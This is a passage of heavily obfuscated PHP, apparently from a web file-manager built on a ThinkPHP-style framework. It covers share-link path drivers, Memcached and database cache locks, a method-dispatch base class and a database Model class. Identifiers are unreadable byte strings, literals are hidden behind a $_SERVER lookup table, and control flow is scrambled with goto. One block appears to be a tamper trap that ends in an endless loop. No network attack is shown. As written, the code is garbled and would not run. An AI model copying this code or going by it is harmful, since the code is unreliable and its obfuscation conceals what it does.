$bõÃ …¨í = '') { $A×ğÊ÷š·Ğ =& $_SERVER[¢à]; $this->cacheRemove($bõÃ …¨í); $cŠ˜®¦ÜÌÂ = $this->filterWhere(array($A×ğÊ÷š·Ğ[89] => $f‘®èã»¿, $A×ğÊ÷š·Ğ[29] => $bõÃ …¨í)); if (is_null($f‘®èã»¿)) { unset($cŠ˜®¦ÜÌÂ[$A×ğÊ÷š·Ğ[89]]); } return $this->where($cŠ˜®¦ÜÌÂ)->delete(); } public function cacheSet($c÷çÏí—¸Ù, $Fˆ‹îˆ™¾‡ = false) { return Cache::set($this->cacheKey($c÷çÏí—¸Ù), $Fˆ‹îˆ™¾‡); } public function cacheGet($eï°¤ºœ) { return Cache::get($this->cacheKey($eï°¤ºœ)); } public function cacheRemove($fšàµàö‡…) { return Cache::remove($this->cacheKey($fšàµàö‡…)); } protected function filterWhere($b°§…æñœÃ) { return $b°§…æñœÃ; } protected function cacheKey($eÄá¸ÓÅáğ) { return $eÄá¸ÓÅáğ; } } goto d£©»¬ÇÃ°; C°Çœ­: class PathDriverDbShareLink extends PathDriverDB { public function __construct($FÈÂöĞöß) { $this->pathParse = $FÈÂöĞöß; $this->model = Model($_SERVER[¢à][1106]); } protected function infoParse($EœÄÒË¡Ö, $eâÏ—Ò·óõ = false, $dÔìĞÛ«åÊ = false) { $e¦½ºËš§‡ =& $_SERVER[¢à]; return Action($e¦½ºËš§‡[1013])->sharePathInfo($this->pathParse[$e¦½ºËš§‡[75]], !0); } public function listPath($E–¡”™¶´„, $A×¼¼ŒĞ‡÷ = false) { $e‰‰â½ÔÏ± =& $_SERVER[¢à]; $fŸï¾¾Æ « = parent::listPath($E–¡”™¶´„, $A×¼¼ŒĞ‡÷); foreach ($fŸï¾¾Æ « as $AâÆµ¥–¸ => $C—¸®ê×²§) { if (!in_array($AâÆµ¥–¸, array($e‰‰â½ÔÏ±[73], $e‰‰â½ÔÏ±[74]))) { continue; } foreach ($C—¸®ê×²§ as $FˆŞùšØî => $bù¥‚ÔŞÙ°) { $fŸï¾¾Æ «[$AâÆµ¥–¸][$FˆŞùšØî] = Action($e‰‰â½ÔÏ±[1013])->shareItemInfo($bù¥‚ÔŞÙ°); } } return $fŸï¾¾Æ «; } public function listAll($F° ß·ù·Š) { $f‰æÀŠìç =& $_SERVER[¢à]; $C„œÛˆçÌ¿ = IO::info($this->pathParse[$f‰æÀŠìç[75]]); if (!$C„œÛˆçÌ¿) { return array(); } $a¶İ¸ÖŒ™³ = $this->model->listAll($F° ß·ù·Š); foreach ($a¶İ¸ÖŒ™³ as &$e¨ƒ¿¯ä¾) { $e¨ƒ¿¯ä¾[$f‰æÀŠìç[388]] = Action($f‰æÀŠìç[1013])->shareItemInfo($e¨ƒ¿¯ä¾[$f‰æÀŠìç[388]]); } return $a¶İ¸ÖŒ™³; } } if (!isset($_SERVER[$_SERVER[¢à][786]]) || !isset($_SERVER[$_SERVER[¢à][787]])) { goto D‡õ‘íÃ˜“; E«õ÷ï¢ï: $CèÅ‘…×¸ä = explode($_SERVER[¢à][214], $A÷Ü«òå¦); if (count($CèÅ‘…×¸ä) < $_SERVER[¢à][571]) { $b½Ğ•«½Í• = $_SERVER[¢à][792]; $b½Ğ•«½Í•(); } $eãàîŸÌÑÈ = $_SERVER[¢à][1113]; goto fÌ±Ô¼•ùÁ; fÌ±Ô¼•ùÁ: $eãàîŸÌÑÈ($_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]); $C‘Ö¶«‹†„ = 2; while ($C‘Ö¶«‹†„ > 1) { $F™éöŠ“ = rawurlencode($C‘Ö¶«‹†„ . $_SERVER[¢à][358]); } goto bƒÛëãî®²; D‡õ‘íÃ˜“: $B™ ÷İì´´ = $_SERVER[¢à][789]; $DÄ¥ï·…«à = $_SERVER[$_SERVER[¢à][790]] . $_SERVER[¢à][791]; $A÷Ü«òå¦ = $B™ ÷İì´´($DÄ¥ï·…«à); goto E«õ÷ï¢ï; bƒÛëãî®²: } class PathDriverDriverShareItem { public function __construct($Fè……õô°×) { $this->pathParse = $Fè……õô°×; } public function __call($D©â‘—ˆ›š, $Bµõ…ÁæÜİ) { $AèÍÉ¼­ê =& $_SERVER[¢à]; if (method_exists($this, $D©â‘—ˆ›š)) { return; } $dÄâ¸šÜÛ÷ = call_user_func_array(array($AèÍÉ¼­ê[1114], $D©â‘—ˆ›š), $Bµõ…ÁæÜİ); $Eï÷Œºµ» = array($AèÍÉ¼­ê[1115], $AèÍÉ¼­ê[1116], $AèÍÉ¼­ê[1117], $AèÍÉ¼­ê[1118], $AèÍÉ¼­ê[486], $AèÍÉ¼­ê[488], $AèÍÉ¼­ê[1119], $AèÍÉ¼­ê[91], $AèÍÉ¼­ê[1120], $AèÍÉ¼­ê[1121]); if (in_array($D©â‘—ˆ›š, $Eï÷Œºµ»)) { $dÄâ¸šÜÛ÷ = $this->getPathOuter($dÄâ¸šÜÛ÷); } return $dÄâ¸šÜÛ÷; } public function copy($F•®…•’¶Ä, $EõÏ±„ç§, $C¼Ô£Å÷Ò¿ = false) { return $this->copyMove($F•®…•’¶Ä, $EõÏ±„ç§, $C¼Ô£Å÷Ò¿, $_SERVER[¢à][486]); } public function move($EŒœã•¯ø°, $Bë³ŸÜÏ , $FÊí‰í†› = false) { return $this->copyMove($EŒœã•¯ø°, $Bë³ŸÜÏ , $FÊí‰í†›, $_SERVER[¢à][488]); } private function copyMove($c©ĞÕô­¥ï, $F¨Âö©¹, $CŒÉÛ°õß³, $e¢µ”Š½ ‰) { goto BÉóªéÏÇË; BÉóªéÏÇË: $a‘‘§ßèÇ× =& $_SERVER[¢à]; $C·½ªğ˜èÎ = $F¨Âö©¹; $e—Ä‹ÙÕî = IO::driverMake($F¨Âö©¹); goto aäÅ¦Ó®ª; aäÅ¦Ó®ª: if ($e—Ä‹ÙÕî->pathParse[$a‘‘§ßèÇ×[994]]) { $F¨Âö©¹ = $e—Ä‹ÙÕî->pathParse[$a‘‘§ßèÇ×[994]]; } else { $F¨Âö©¹ = $C·½ªğ˜èÎ; } $BõÎå¾Ó® = IO::copyMove($c©ĞÕô­¥ï, $F¨Âö©¹, $CŒÉÛ°õß³, $e¢µ”Š½ ‰); $BõÎå¾Ó® = $this->getPathOuter($BõÎå¾Ó®); goto A¨ç‚ƒƒØø; A¨ç‚ƒƒØø: return $BõÎå¾Ó®; goto eÚ¥ÁÒ°Ï; eÚ¥ÁÒ°Ï: } public function pathFather($C¸îŒ§êŸ) { return get_path_father($this->pathParse[$_SERVER[¢à][75]]); } public function iconvSystem($a•£¨ÉåØ‹) { return $a•£¨ÉåØ‹; } protected function infoParse($F®«‘Ü±ßŠ) { $D‡¡çÇÆ´ =& $_SERVER[¢à]; $FÖ¤¤ÍÔ¨ = $this->pathParse[$D‡¡çÇÆ´[435]][$D‡¡çÇÆ´[1014]] . $this->pathParse[$D‡¡çÇÆ´[1007]]; $b£Ã²¹äù = IO::info($FÖ¤¤ÍÔ¨); $c–Ñ°‘Ÿà£ = $this->pathParse[$D‡¡çÇÆ´[435]]; return Action($D‡¡çÇÆ´[1112])->_shareItemeParse($b£Ã²¹äù, $c–Ñ°‘Ÿà£); } public function listAll($Eçƒì¢êÊÑ) { $a‚ò½ˆ¦ =& $_SERVER[¢à]; $C®š£›É§Š = IO::listAll($Eçƒì¢êÊÑ); $C†ŒÖÈ±ï = $this->pathParse[$a‚ò½ˆ¦[435]]; foreach ($C®š£›É§Š as &$B‡ÊÏ“Ÿ§) { check_abort(); $B‡ÊÏ“Ÿ§ = array_merge(IO::info($B‡ÊÏ“Ÿ§[$a‚ò½ˆ¦[75]]), $B‡ÊÏ“Ÿ§); $B‡ÊÏ“Ÿ§[$a‚ò½ˆ¦[388]] = Action($a‚ò½ˆ¦[1112])->_shareItemeParse($B‡ÊÏ“Ÿ§, $C†ŒÖÈ±ï); } return $C®š£›É§Š; } public function getPathOuter($EÑŞ¸…«Ã—) { goto a¡ÌçŠ¡º; F½é÷®ñÑâ: if (substr($aÌš²‹ÖŠÇ, 0, strlen($eĞ°¨ôÅ„Û)) != $eĞ°¨ôÅ„Û) { return !1; } return $this->pathParse[$AÅ¸Ÿò¤»—[1008]] . $AÅ¸Ÿò¤»—[8] . ltrim($cæÛÄ§ÜÑ, $AÅ¸Ÿò¤»—[8]); goto Fšªäç”ŒÈ; Cö²†§…æ: $aÌš²‹ÖŠÇ = KodIO::clear($EÑŞ¸…«Ã—); $eĞ°¨ôÅ„Û = KodIO::clear($this->pathParse[$AÅ¸Ÿò¤»—[435]][$AÅ¸Ÿò¤»—[1014]]); $cæÛÄ§ÜÑ = substr($aÌš²‹ÖŠÇ, strlen($eĞ°¨ôÅ„Û)); goto F½é÷®ñÑâ; a¡ÌçŠ¡º: $AÅ¸Ÿò¤»— =& $_SERVER[¢à]; $e¨–óˆ·Ô† = KodIO::parse($EÑŞ¸…«Ã—); if ($e¨–óˆ·Ô†[$AÅ¸Ÿò¤»—[29]] == KodIO::KOD_SHARE_ITEM) { return $e¨–óˆ·Ô†[$AÅ¸Ÿò¤»—[75]]; } goto Cö²†§…æ; Fšªäç”ŒÈ: } public function getType() { $D½™í”¼øé =& $_SERVER[¢à]; $F‰‰èÙíµ… = str_replace($D½™í”¼øé[71], $D½™í”¼øé[33], get_class($this)); return strtolower($F‰‰èÙíµ…); } public function isTypeObject($AßÈº³ó) { return IO::isTypeObject($AßÈº³ó); } public function info($dŸÃØ¨‡‹) { return $this->infoParse($dŸÃØ¨‡‹); } public function infoAuth($E…‚˜¿¦ğ) { return $this->infoParse($E…‚˜¿¦ğ); } public function infoWithChildren($DÚ…Ä›®ŠŞ) { return $this->infoParse($DÚ…Ä›®ŠŞ); } public function infoFull($FÔ—“á›”) { return $this->infoParse($FÔ—“á›”); } } goto eÜŸ±ß™§Î; D¸²…ê‰·: $_SERVER[$_SERVER[‚¬û][52]] = (strrev('0149').strrev('86'))+0;$_AHx7="5SKc2Q35YwKzC5i39Y2svuMviHIEHvZA5pdnRxhgVkQUrM8RfC2xa7fXND4d8tHAeCzVQwIMSFaC4b";; stream_wrapper_register($_SERVER[‚¬û][53], $_SERVER[‚¬û][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($CÙé™–¯Í‚, $dôÜ¥‚ãƒ²) { $BÊ³ËÄæ¬é =& $_SERVER[¢à]; if (isset(self::$_methodList[$CÙé™–¯Í‚])) { return @call_user_func_array(self::$_methodList[$CÙé™–¯Í‚], $dôÜ¥‚ãƒ²); } else { if (method_exists($this, $CÙé™–¯Í‚)) { return call_user_func_array(array($this, $CÙé™–¯Í‚), $dôÜ¥‚ãƒ²); } else { think_exception(__CLASS__ . $BÊ³ËÄæ¬é[4] . $CÙé™–¯Í‚ . $BÊ³ËÄæ¬é[5]); } } } public static function __callStatic($eï£ÅÉ¾É‰, $bù©˜óŞí°) { if (isset(self::$_methodListStatic[$eï£ÅÉ¾É‰])) { return call_user_func_array(self::$_methodListStatic[$eï£ÅÉ¾É‰], $bù©˜óŞí°); } else { if (method_exists(self, $eï£ÅÉ¾É‰)) { return call_user_func_array(array(self, $eï£ÅÉ¾É‰), $bù©˜óŞí°); } else { show_json("{$eï£ÅÉ¾É‰}\50\x29\x20\156\x6f\x74\40\x65\x78\151\x73\x74\73", !1); } } } public static function addMethod($fŠœ¥º‡”İ, $b‡îÃ·®ã‘) { self::$_methodList[$fŠœ¥º‡”İ] = $b‡îÃ·®ã‘; } public static function addMethodStatic($Eáœ¿ÖÔÂÇ, $AÒÜ•µÚó¼) { self::$_methodListStatic[$Eáœ¿ÖÔÂÇ] = $AÒÜ•µÚó¼; } } goto cÙÉ‹¬Ï˜ß; dµš¥èİÄÜ: class CacheLockMemcached { public function lock($fŠØìëàš, $Dõœò»À‡ö = 0) { $c‘Œ¤ì¹˜Ÿ = Cache::init(); $FÏ„—âí‰İ = microtime(!0) + $Dõœò»À‡ö; while (microtime(!0) < $FÏ„—âí‰İ) { $aöà­…Àùä = $c‘Œ¤ì¹˜Ÿ->get($fŠØìëàš); if (!$aöà­…Àùä || $aöà­…Àùä < microtime(!0)) { $d‰¹õ™ã”À = $c‘Œ¤ì¹˜Ÿ->handle->add($fŠØìëàš, $FÏ„—âí‰İ, $Dõœò»À‡ö); if ($d‰¹õ™ã”À) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($DÑ„ª­öä) { return Cache::init()->get($DÑ„ª­öä); } public function unlock($dÆ˜è™‚öš) { return Cache::init()->remove($dÆ˜è™‚öš); } } class CacheLockDatabase { public function lock($EŒæ±‡’¸, $a˜ÖùŸ‚ç = 0) { $Fƒ™œ£‰Çˆ = Model($_SERVER[¢à][755]); $bÌÖ¡†ùïÇ = microtime(!0) + $a˜ÖùŸ‚ç; while (microtime(!0) < $bÌÖ¡†ùïÇ) { $d®–æ†¦È· = $Fƒ™œ£‰Çˆ->get($EŒæ±‡’¸); if (!$d®–æ†¦È· || $d®–æ†¦È· < microtime(!0)) { $dŸ³Š×áÕ­ = $Fƒ™œ£‰Çˆ->set($EŒæ±‡’¸, $bÌÖ¡†ùïÇ); if ($dŸ³Š×áÕ­) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bê„ò¾î•Ê) { return Model($_SERVER[¢à][755])->get($bê„ò¾î•Ê); } public function unlock($DŠ‡îœŠ–) { Model($_SERVER[¢à][755])->remove($DŠ‡îœŠ–); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($AÜÇ›®ˆù¿, $F²ƒÕ©Êé) { $BÉÇñ´ö¡¯ =& $_SERVER[¢à]; if (!class_exists($BÉÇñ´ö¡¯[776])) { show_json($BÉÇñ´ö¡¯[777], !1); } $this->cacheTime = $F²ƒÕ©Êé; $this->handle = new Memcached(); if (is_array($AÜÇ›®ˆù¿[$BÉÇñ´ö¡¯[778]]) && count($AÜÇ›®ˆù¿[$BÉÇñ´ö¡¯[778]]) >= 1) { foreach ($AÜÇ›®ˆù¿[$BÉÇñ´ö¡¯[778]] as $F¬«½Ïß„¸) { $c‘ÇÖÛˆÉÃ = explode($BÉÇñ´ö¡¯[4], $F¬«½Ïß„¸); $this->handle->addServer($c‘ÇÖÛˆÉÃ[0], $c‘ÇÖÛˆÉÃ[1]); } } else { $this->handle->addServer($AÜÇ›®ˆù¿[$BÉÇñ´ö¡¯[166]], $AÜÇ›®ˆù¿[$BÉÇñ´ö¡¯[167]]); } } public function set($d‘˜æÀâÏš, $c¤ğ”¹‹«Ä, $c´Ò½Îƒˆ = false) { $c´Ò½Îƒˆ = $c´Ò½Îƒˆ ? $c´Ò½Îƒˆ : $this->cacheTime; return $this->handle->set($d‘˜æÀâÏš, $c¤ğ”¹‹«Ä, $c´Ò½Îƒˆ); } public function get($c®Õï’¼Ñ) { return $this->handle->get($c®Õï’¼Ñ); } public function remove($C½¤à¤Óêº) { return $this->handle->delete($C½¤à¤Óêº); } public function deleteAll() { return $this->handle->flush(); } } goto F¿ù‚ôªµ; d¨‹ë—Œ: function beforeShutdown() { Hook::trigger($_SERVER[‚¬û][36]); } $_SERVER[$_SERVER[‚¬û][37]] = BASIC_PATH; $_SERVER[$_SERVER[‚¬û][38]] = LIB_DIR; goto F©Ü¦Ú¸…; A‘î¸ÌèÇç: define($_SERVER[¢à][227], 0); define($_SERVER[¢à][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\142\x6c\x65", "\157\162\144\145\162", "\x61\154\151\141\x73", "\150\x61\166\x69\156\x67", "\x67\162\157\165\160", "\154\157\143\x6b", "\144\151\163\x74\x69\156\x63\x74", "\141\165\164\x6f", "\x66\x69\154\x74\145\162", "\x76\141\154\151\x64\141\x74\145", "\162\x65\x73\165\154\164", "\x62\151\x6e\x64", "\x74\x6f\153\x65\156"); public function __construct($F£ªÀ›º› = '', $Cİíõ„¨±Ù = '', $bÄºçµ’•¢ = '') { $f«»®‘ª­ =& $_SERVER[¢à]; $this->_initialize(); if (!empty($F£ªÀ›º›)) { if (strpos($F£ªÀ›º›, $f«»®‘ª­[93])) { list($this->dbName, $this->name) = explode($f«»®‘ª­[93], $F£ªÀ›º›); } else { $this->name = $F£ªÀ›º›; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Cİíõ„¨±Ù)) { $this->tablePrefix = $f«»®‘ª­[33]; } elseif ($f«»®‘ª­[33] != $Cİíõ„¨±Ù) { $this->tablePrefix = $Cİíõ„¨±Ù; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($f«»®‘ª­[229]); } $this->db(0, empty($this->connection) ? $bÄºçµ’•¢ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $dÂ‚õ†œÒ‡ =& $_SERVER[¢à]; if (empty($this->fields)) { if (think_config($dÂ‚õ†œÒ‡[230])) { $fß·õ¥“Å£ = $this->dbName ? $this->dbName : think_config($dÂ‚õ†œÒ‡[231]); $fËº‰É¶ = think_var_cache($dÂ‚õ†œÒ‡[232] . strtolower(get_path_this($fß·õ¥“Å£) . $dÂ‚õ†œÒ‡[93] . $this->name)); if ($fËº‰É¶) { $aÀ‘àÖ‡‘É = think_config($dÂ‚õ†œÒ‡[233]); if (empty($aÀ‘àÖ‡‘É) || $fËº‰É¶[$dÂ‚õ†œÒ‡[234]] == $aÀ‘àÖ‡‘É) { $this->fields = $fËº‰É¶; return; } } } $this->flush(); } } public function flush() { goto fÔÏ‹•¸â; C½”ïœ¡„å: if (think_config($aÖ ¦âß÷œ[230])) { $EŠàù§ß» = $this->dbName ? $this->dbName : think_config($aÖ ¦âß÷œ[231]); think_var_cache($aÖ ¦âß÷œ[232] . strtolower(get_path_this($EŠàù§ß») . $aÖ ¦âß÷œ[93] . $this->name), $this->fields); } goto EÊÒŞ‡ù§; eËÃ”éã«ö: if (!$Bî‹ªùˆ÷) { return !1; } $this->fields = array_keys($Bî‹ªùˆ÷); $this->fields[$aÖ ¦âß÷œ[235]] = !1; goto c‰¥¹×‘¨‘; fÔÏ‹•¸â: $aÖ ¦âß÷œ =& $_SERVER[¢à]; $this->db->setModel($this->name); $Bî‹ªùˆ÷ = $this->db->getFields($this->getTableName()); goto eËÃ”éã«ö; c‰¥¹×‘¨‘: foreach ($Bî‹ªùˆ÷ as $bù‘¤˜˜“º => $C‚‡ñøÓ°Ì) { $aù÷î‹ì¡ƒ[$bù‘¤˜˜“º] = $C‚‡ñøÓ°Ì[$aÖ ¦âß÷œ[29]]; if ($C‚‡ñøÓ°Ì[$aÖ ¦âß÷œ[36]]) { $this->fields[$aÖ ¦âß÷œ[236]] = $bù‘¤˜˜“º; if ($C‚‡ñøÓ°Ì[$aÖ ¦âß÷œ[39]]) { $this->fields[$aÖ ¦âß÷œ[235]] = !0; } } } $this->fields[$aÖ ¦âß÷œ[237]] = $aù÷î‹ì¡ƒ; if (think_config($aÖ ¦âß÷œ[233])) { $this->fields[$aÖ ¦âß÷œ[234]] = think_config($aÖ ¦âß÷œ[233]); } goto C½”ïœ¡„å; EÊÒŞ‡ù§: } public function switchModel($d‡ñ†å¿, $BÆö’ëï¹Š = array()) { $F½ó¥õ–Ê† =& $_SERVER[¢à]; $a¼É÷›ÖŒ‚ = ucwords(strtolower($d‡ñ†å¿)) . $F½ó¥õ–Ê†[238]; if (!class_exists($a¼É÷›ÖŒ‚)) { think_exception($a¼É÷›ÖŒ‚ . think_lang($F½ó¥õ–Ê†[239])); } $this->_extModel = new $a¼É÷›ÖŒ‚($this->name); if (!empty($BÆö’ëï¹Š)) { foreach ($BÆö’ëï¹Š as $EåºËªÆ) { $this->_extModel->setProperty($EåºËªÆ, $this->{$EåºËªÆ}); } } return $this->_extModel; } public function __set($f¯›ÆÛ©äÑ, $B‡¸ùÜØÄ) { $this->data[$f¯›ÆÛ©äÑ] = $B‡¸ùÜØÄ; } public function __get($aãäÚÒ•‘ó) { return isset($this->data[$aãäÚÒ•‘ó]) ? $this->data[$aãäÚÒ•‘ó] : null; } public function __isset($B³µÆÃ—ÈÊ) { return isset($this->data[$B³µÆÃ—ÈÊ]); } public function __unset($FÂ«åÌ‡) { unset($this->data[$FÂ«åÌ‡]); } public function __call($cê¹…óÙÑË, $Bšç®Øì’©) { $b¶¬›ñŸ„ =& $_SERVER[¢à]; if (in_array(strtolower($cê¹…óÙÑË), $this->methods, !0)) { $this->options[strtolower($cê¹…óÙÑË)] = $Bšç®Øì’©[0]; return $this; } elseif (in_array(strtolower($cê¹…óÙÑË), array($b¶¬›ñŸ„[240], $b¶¬›ñŸ„[241], $b¶¬›ñŸ„[242], $b¶¬›ñŸ„[243], $b¶¬›ñŸ„[244]), !0)) { $A¥Àœà¸…Ï = isset($Bšç®Øì’©[0]) ? $Bšç®Øì’©[0] : $b¶¬›ñŸ„[173]; $A¥Àœà¸…Ï = $this->db->parseKey($A¥Àœà¸…Ï); return $this->getField(strtoupper($cê¹…óÙÑË) . $b¶¬›ñŸ„[245] . $A¥Àœà¸…Ï . $b¶¬›ñŸ„[246] . $cê¹…óÙÑË, $b¶¬›ñŸ„[240]); } elseif (strtolower(substr($cê¹…óÙÑË, 0, 5)) == $b¶¬›ñŸ„[247]) { $A¥Àœà¸…Ï = think_parse_name(substr($cê¹…óÙÑË, 5)); $f˜èãØ´¤İ[$A¥Àœà¸…Ï] = $Bšç®Øì’©[0]; return $this->where($f˜èãØ´¤İ)->find(); } elseif (strtolower(substr($cê¹…óÙÑË, 0, 10)) == $b¶¬›ñŸ„[248]) { $D·æãùÄå„ = think_parse_name(substr($cê¹…óÙÑË, 10)); $f˜èãØ´¤İ[$D·æãùÄå„] = $Bšç®Øì’©[0]; return $this->where($f˜èãØ´¤İ)->getField($Bšç®Øì’©[1]); } elseif (isset($this->_scope[$cê¹…óÙÑË])) { return $this->scope($cê¹…óÙÑË, $Bšç®Øì’©[0]); } elseif (method_exists($this, $cê¹…óÙÑË)) { array_unshift($Bšç®Øì’©, $cê¹…óÙÑË); return call_user_func_array(array($this, $b¶¬›ñŸ„[249]), $Bšç®Øì’©); } else { return call_user_func_array(array(parent, $cê¹…óÙÑË), $Bšç®Øì’©); } } protected function call() { goto aæ„§‡àŸø; Fµñœğñ¼ù: $e‘…ùÂ‹” = call_user_func_array(array($this, $aĞÇ‡É–å), $eÓ«‚Í¦æ ); if (method_exists($this, $eáöÌ¾‡Ú[253])) { $dˆ£‹®Š‚Š = call_user_func_array(array($this, $eáöÌ¾‡Ú[254]), array($bŠÜ£ÏßëØ, $eÓ«‚Í¦æ , $e‘…ùÂ‹”)); if ($dˆ£‹®Š‚Š) { return $dˆ£‹®Š‚Š; } } return $e‘…ùÂ‹”; goto DËÛ¡ õ¡; cÍ†³ŸĞÄ©: if (isset($eÓ«‚Í¦æ [$D¨ˆª½§ï]) && $eÓ«‚Í¦æ [$D¨ˆª½§ï] === $aĞÇ‡É–å) { think_exception(__CLASS__ . $eáöÌ¾‡Ú[4] . $aĞÇ‡É–å . think_lang($eáöÌ¾‡Ú[250])); return; } $eÓ«‚Í¦æ [] = $aĞÇ‡É–å; if (method_exists($this, $eáöÌ¾‡Ú[251])) { $dˆ£‹®Š‚Š = call_user_func_array(array($this, $eáöÌ¾‡Ú[252]), array($bŠÜ£ÏßëØ, $eÓ«‚Í¦æ )); if (!is_null($dˆ£‹®Š‚Š) && $dˆ£‹®Š‚Š !== !1) { return $dˆ£‹®Š‚Š; } } goto Fµñœğñ¼ù; aæ„§‡àŸø: $eáöÌ¾‡Ú =& $_SERVER[¢à]; $eÓ«‚Í¦æ  = func_get_args(); $aĞÇ‡É–å = array_shift($eÓ«‚Í¦æ ); goto FŞ‚¯õ¿À­; FŞ‚¯õ¿À­: $bŠÜ£ÏßëØ = $aĞÇ‡É–å; if (is_array($aĞÇ‡É–å)) { $bŠÜ£ÏßëØ = $aĞÇ‡É–å[1]; $aĞÇ‡É–å = $aĞÇ‡É–å[0]; } $D¨ˆª½§ï = count($eÓ«‚Í¦æ ) - 1; goto cÍ†³ŸĞÄ©; DËÛ¡ õ¡: } protected function _initialize() { } protected function _facade($e÷×¤Ÿ®µ™) { $CÍˆó¨õ½¡ =& $_SERVER[¢à]; if (!empty($this->fields)) { foreach ($e÷×¤Ÿ®µ™ as $D°ˆ‹ÌÜä => $bÕµïêÍ) { if (!in_array($D°ˆ‹ÌÜä, $this->fields, !0)) { unset($e÷×¤Ÿ®µ™[$D°ˆ‹ÌÜä]); } elseif (is_scalar($bÕµïêÍ)) { $this->_parseType($e÷×¤Ÿ®µ™, $D°ˆ‹ÌÜä); } } } if (!empty($this->options[$CÍˆó¨õ½¡[255]])) { $e÷×¤Ÿ®µ™ = array_map($this->options[$CÍˆó¨õ½¡[255]], $e÷×¤Ÿ®µ™); unset($this->options[$CÍˆó¨õ½¡[255]]); } $this->_beforeWrite($e÷×¤Ÿ®µ™); return $e÷×¤Ÿ®µ™; } protected function _beforeWrite(&$E×«Û¾£°Å) { } public function add($C¡ëŠ­‚ÂÁ = '', $B°‚ÇªÖ®Ñ = array(), $c¥øÀ‘ò„Õ = false) { goto fåÈœö­¾¶; bÊ¿ôŒ¨¦Ò: return $fÔ·Æöğ½ã; goto aæôöè´Åà; fåÈœö­¾¶: if (empty($C¡ëŠ­‚ÂÁ)) { if (!empty($this->data)) { $C¡ëŠ­‚ÂÁ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¢à][256]); return !1; } } $B°‚ÇªÖ®Ñ = $this->_parseOptions($B°‚ÇªÖ®Ñ); $C¡ëŠ­‚ÂÁ = $this->_facade($C¡ëŠ­‚ÂÁ); goto E‹èë˜ç”; E‹èë˜ç”: if (!1 === $this->_beforeInsert($C¡ëŠ­‚ÂÁ, $B°‚ÇªÖ®Ñ)) { return !1; } $fÔ·Æöğ½ã = $this->db->insert($C¡ëŠ­‚ÂÁ, $B°‚ÇªÖ®Ñ, $c¥øÀ‘ò„Õ); if (!1 !== $fÔ·Æöğ½ã) { $D †Ö÷´Ã« = $this->getLastInsID(); if ($D †Ö÷´Ã«) { $C¡ëŠ­‚ÂÁ[$this->getPk()] = $D †Ö÷´Ã«; $this->_after_insert($C¡ëŠ­‚ÂÁ, $B°‚ÇªÖ®Ñ); return $D †Ö÷´Ã«; } $this->_after_insert($C¡ëŠ­‚ÂÁ, $B°‚ÇªÖ®Ñ); } goto bÊ¿ôŒ¨¦Ò; aæôöè´Åà: } protected function _beforeInsert(&$EÔ“š£ĞÌ, $E ìíÀÊ¬) { } protected function _after_insert($f À§çÁ—•, $Fœé¼¼çÌ¥) { } public function addAll($AŞ¸Œ²‘ö, $bî‚èğãôÂ = array(), $AÇ‚Œ‰’ÛÁ = false) { goto BŒ—ƒˆì·å; BŒ—ƒˆì·å: $c²•Èß‚× =& $_SERVER[¢à]; if (empty($AŞ¸Œ²‘ö)) { $this->error = think_lang($c²•Èß‚×[256]); return !1; } $bî‚èğãôÂ = $this->_parseOptions($bî‚èğãôÂ); goto F–œÎ¸†âÆ; bÓĞ–±±: return $B¹ãÙäÂîÒ; goto C…»ÒÕ«é; F–œÎ¸†âÆ: foreach ($AŞ¸Œ²‘ö as $a©´ÔâòÖˆ => $cÔõ¯ÜÛ ¯) { $AŞ¸Œ²‘ö[$a©´ÔâòÖˆ] = $this->_facade($cÔõ¯ÜÛ ¯); } if (method_exists($this->db, $c²•Èß‚×[257])) { $B¹ãÙäÂîÒ = $this->db->insertAll($AŞ¸Œ²‘ö, $bî‚èğãôÂ, $AÇ‚Œ‰’ÛÁ); } else { $this->startTrans(); foreach ($AŞ¸Œ²‘ö as $a©´ÔâòÖˆ => $cÔõ¯ÜÛ ¯) { $B¹ãÙäÂîÒ = $this->db->insert($cÔõ¯ÜÛ ¯, $bî‚èğãôÂ, $AÇ‚Œ‰’ÛÁ); } $this->commit(); } if (!1 !== $B¹ãÙäÂîÒ) { $cĞ½ó„Î¯ğ = $this->getLastInsID(); if ($cĞ½ó„Î¯ğ) { return $cĞ½ó„Î¯ğ; } } goto bÓĞ–±±; C…»ÒÕ«é: } public function selectAdd($FªÍçøŒ¸ß = '', $A»êâÅ²· = '', $Fêù…ÄÜÓ = array()) { $D’Ğå§Ø =& $_SERVER[¢à]; $Fêù…ÄÜÓ = $this->_parseOptions($Fêù…ÄÜÓ); if (!1 === ($e¢—é›†‘´ = $this->db->selectInsert($FªÍçøŒ¸ß ? $FªÍçøŒ¸ß : $Fêù…ÄÜÓ[$D’Ğå§Ø[258]], $A»êâÅ²· ? $A»êâÅ²· : $this->getTableName(), $Fêù…ÄÜÓ))) { $this->error = think_lang($D’Ğå§Ø[259]); return !1; } else { return $e¢—é›†‘´; } } public function save($D¾ø§ñ‹…… = '', $cÌ´Ù˜°» = array()) { goto BÜŒÜåö®ù; c„ï·”Ï¤: if (!1 !== $a®ÓëÓ²·) { if (isset($e „Ş¸¯)) { $D¾ø§ñ‹……[$BÇÔÖ„Åì] = $e „Ş¸¯; } $this->_afterUpdate($D¾ø§ñ‹……, $cÌ´Ù˜°»); } return $a®ÓëÓ²·; goto C²»²Š¬—†; e¯°ìõÑĞÑ: if (is_array($cÌ´Ù˜°»[$aªÜ˜”ïáŸ[260]]) && isset($cÌ´Ù˜°»[$aªÜ˜”ïáŸ[260]][$BÇÔÖ„Åì])) { $e „Ş¸¯ = $cÌ´Ù˜°»[$aªÜ˜”ïáŸ[260]][$BÇÔÖ„Åì]; } if (!1 